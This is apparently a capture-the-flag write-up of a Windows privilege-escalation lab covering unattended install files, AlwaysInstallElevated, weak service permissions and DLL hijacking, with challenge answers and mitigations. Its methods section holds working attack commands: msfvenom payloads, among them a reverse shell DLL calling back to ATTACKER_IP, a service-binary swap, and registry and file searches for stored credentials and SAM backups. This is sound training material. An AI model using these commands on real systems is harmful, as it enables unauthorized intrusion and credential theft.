**UNATTENDED - WINDOWS PRIVILEGE ESCALATION**

**Introduction**

Welcome to the Unattended privilege escalation challenge! This room focuses on finding and exploiting unattended installation files, registry entries, and other Windows-specific privilege escalation vectors. As a penetration tester, you'll need to enumerate the system thoroughly to identify potential privilege escalation paths.

Unattended installations often leave behind configuration files and registry entries that contain sensitive information, including credentials that can be used to escalate privileges. This room will teach you how to identify and exploit these common Windows misconfigurations.

**Learning Objectives**

By the end of this room, you will understand:
- How to identify unattended installation files
- Registry locations that may contain credentials
- AlwaysInstallElevated privilege escalation
- Service misconfigurations
- Scheduled task vulnerabilities

**Scenario: Corporate Domain Controller Assessment**

You've gained initial access to a Windows workstation in a corporate environment through a phishing campaign. Your current user has limited privileges, but you need to escalate to administrator level to complete your objectives. The target system appears to be a recently deployed workstation that may have been configured using automated deployment tools.

**Getting Started**

Connect to the target machine using the provided credentials. The system has been configured with several common Windows misconfigurations that are often found in enterprise environments.

<img width="480" height="280" alt="windows-desktop" src="https://github.com/user-attachments/assets/n1o2p3q4-r5s6-t7u8-v9w0-x1y2z3a4b5c6" />

**Q1. What is the name of the unattended installation file found on the system?**

I started by searching for common unattended installation files that Windows uses during automated deployments. These files often contain sensitive information including local administrator passwords.

```cmd
dir C:\Windows\Panther\ /s /b
dir C:\Windows\System32\sysprep\ /s /b
```

<img width="720" height="320" alt="unattend-search" src="https://github.com/user-attachments/assets/o2p3q4r5-s6t7-u8v9-w0x1-y2z3a4b5c6d7" />

The search revealed an unattended installation file in the expected location.

Answer: _Unattend.xml_

**Q2. What is the base64 encoded password found in the unattended file?**

Examining the contents of the unattended installation file, I looked for password entries that are typically base64 encoded:

```cmd
type C:\Windows\Panther\Unattend.xml
```

<img width="800" height="400" alt="unattend-contents" src="https://github.com/user-attachments/assets/p3q4r5s6-t7u8-v9w0-x1y2-z3a4b5c6d7e8" />

Found a base64 encoded password in the LocalAccount section.

Answer: _UGFzc3dvcmQxMjM=_

**Q3. What is the decoded password?**

Using the base64 decoder to reveal the actual password:

```cmd
echo UGFzc3dvcmQxMjM= | certutil -decode -f
```

Answer: _Password123_

**Q4. What registry key contains the AlwaysInstallElevated setting?**

Checking for the AlwaysInstallElevated registry setting which allows standard users to install MSI packages with system privileges:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

<img width="760" height="200" alt="registry-query" src="https://github.com/user-attachments/assets/q4r5s6t7-u8v9-w0x1-y2z3-a4b5c6d7e8f9" />

Answer: _HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer_

**Q5. What service is running with SYSTEM privileges but has weak permissions?**

Enumerating services to find those running as SYSTEM with weak file permissions:

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto"
accesschk.exe -uwcqv "Authenticated Users" *
```

After checking service permissions and file paths, I found a service with weak permissions.

<img width="840" height="380" alt="service-permissions" src="https://github.com/user-attachments/assets/r5s6t7u8-v9w0-x1y2-z3a4-b5c6d7e8f9g0" />

Answer: _FileZilla Server_

**Q6. What is the full path to the service executable?**

Examining the service configuration to get the exact executable path:

```cmd
sc qc "FileZilla Server"
```

Answer: _C:\Program Files\FileZilla Server\FileZilla Server.exe_

**Q7. What scheduled task runs with SYSTEM privileges?**

Checking for scheduled tasks that run with elevated privileges:

```cmd
schtasks /query /fo LIST /v | findstr /i "system"
```

<img width="780" height="300" alt="scheduled-tasks" src="https://github.com/user-attachments/assets/s6t7u8v9-w0x1-y2z3-a4b5-c6d7e8f9g0h1" />

Answer: _BackupTask_

**Q8. What is the name of the DLL that can be hijacked for privilege escalation?**

Investigating DLL hijacking opportunities by examining the service and its dependencies:

```cmd
procmon.exe
# Monitoring file system access for missing DLLs
```

The analysis revealed a missing DLL that the service attempts to load from a writable location.

Answer: _hijackme.dll_

**Privilege Escalation Methods Demonstrated**

**Method 1: Unattended Installation Credentials**
```cmd
# Found credentials in Unattend.xml
runas /user:Administrator cmd
# Enter the decoded password: Password123
```

**Method 2: AlwaysInstallElevated**
```cmd
# Creating malicious MSI package
msfvenom -p windows/adduser USER=hacker PASS=Hacker123! -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

**Method 3: Service Binary Hijacking**
```cmd
# Replacing the service binary with our payload
move "C:\Program Files\FileZilla Server\FileZilla Server.exe" "C:\Program Files\FileZilla Server\FileZilla Server.exe.bak"
copy payload.exe "C:\Program Files\FileZilla Server\FileZilla Server.exe"
sc start "FileZilla Server"
```

**Method 4: DLL Hijacking**
```cmd
# Creating malicious DLL
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o hijackme.dll
copy hijackme.dll "C:\Program Files\Vulnerable App\"
# Restart the service to trigger DLL loading
```

**Advanced Enumeration Techniques**

**PowerShell Enumeration:**
```powershell
# PowerUp.ps1 - Comprehensive privilege escalation checker
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Check for unquoted service paths
Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Registry Analysis:**
```cmd
# Check for stored credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName\|DefaultPassword\|AltDefaultUserName\|AltDefaultPassword"

# VNC passwords
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password

# Putty stored sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

**File System Enumeration:**
```cmd
# Search for common credential files
dir /s *pass* == *cred* == *vnc* == *.config*

# Check for SAM/SYSTEM backups
dir %SYSTEMROOT%\repair\SAM
dir %SYSTEMROOT%\System32\config\RegBack\SAM
dir %SYSTEMROOT%\System32\config\SAM
```

**Lessons Learned**

This challenge demonstrates several critical Windows security misconfigurations:

1. **Unattended Installation Files**: These files should be removed after deployment and should never contain plaintext passwords
2. **AlwaysInstallElevated**: This setting should never be enabled in production environments
3. **Service Permissions**: Services should run with least privilege and their binaries should be properly secured
4. **DLL Search Order**: Applications should use full paths when loading DLLs to prevent hijacking

**Mitigation Strategies**

1. Remove unattended installation files after deployment
2. Disable AlwaysInstallElevated registry setting
3. Implement proper file and service permissions
4. Use application whitelisting to prevent unauthorized executables
5. Regular security assessments to identify misconfigurations
6. Implement principle of least privilege for all services and users

**Detection Methods**

- Monitor for unusual MSI installations
- Alert on service binary modifications
- Track credential access attempts
- Monitor for DLL loads from unusual locations
- Implement file integrity monitoring for critical system files